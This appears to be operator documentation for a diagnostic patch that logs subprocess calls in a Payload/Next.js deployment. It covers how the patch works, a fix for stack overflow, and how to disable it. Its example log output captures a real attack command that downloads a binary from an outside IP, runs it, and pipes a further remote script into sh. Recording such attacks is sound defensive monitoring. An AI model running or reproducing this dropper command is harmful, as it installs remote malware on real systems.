# Subprocess Diagnostic Monkey Patch - Explanation

## What It Does

The `subprocessGlobalDiag.ts` script **monitors** (logs) all subprocess executions in the Payload application. It does **NOT** kill or block malicious commands - it only logs them for security monitoring.

### How It Works

1. **Monkey Patches** all `child_process` methods globally:
   - `exec()`
   - `execSync()`
   - `execFile()`
   - `spawn()`
   - `spawnSync()`

2. **Logs** every subprocess call with:
   - Timestamp
   - Method name (execSync, spawn, etc.)
   - Command/arguments (secrets masked)
   - Stack trace (limited to 5 frames)
   - Options

3. **Then executes** the original command normally (doesn't block)

## Stack Overflow Fix

### Problem
When malicious code calls `execSync` in a loop/recursion, each call goes through our patch, causing stack overflow.

### Solution
- **Rate Limiting**: Same command signature only logged once per second
- **Reduced Stack Frames**: From 12 to 5 frames (lighter stack trace generation)
- **Error Handling**: Stack trace generation wrapped in try/catch to prevent recursion
- **Logging Guard**: `isLogging` flag prevents recursion within logging function

## Disabling the Patch

To disable the patch entirely (while keeping monitoring code available):

```bash
# Add to .env
DISABLE_SUBPROC_DIAG=true
```

Then rebuild and restart:
```bash
cd /srv/payload
docker compose --profile build run --rm payload-build
docker compose restart payload
```

## Current Status

- ✅ **Active** (rate-limited to prevent stack overflow)
- ✅ **Monitoring** all subprocess calls
- ✅ **Logging** to container stdout (visible via `docker compose logs payload`)

## Example Log Output

```json
[SUBPROC_DIAG_GLOBAL] {"ts":"2025-12-12T15:14:28.123Z","method":"execSync","cmd":"(cd /dev;(busybox wget -O x86 http://5.231.70.66/nuts/x86||curl -s -o x86 http://5.231.70.66/nuts/x86 );chmod 777 x86;./x86 reactOnMynuts;(busybox wget -q http://5.231.70.66/nuts/bolts -O-||wget -q http://5.231.70.66/nuts/bolts -O-||curl -s http://5.231.70.66/nuts/bolts)|sh)&","stack":"at d.execSync (/app/.next/server/chunks/4437.js:2:309) | at Object.eval [as then] (eval at <anonymous> (/app/node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:25:34007), <anonymous>:3:53)"}
```

## Security Note

This is a **diagnostic tool** for security monitoring. It does not:
- ❌ Block malicious commands
- ❌ Kill processes
- ❌ Prevent execution

It only **logs** for visibility. Actual security should be handled by:
- Authentication on endpoints
- Input validation
- Path sanitization
- Safe subprocess patterns (execFile with arrays)

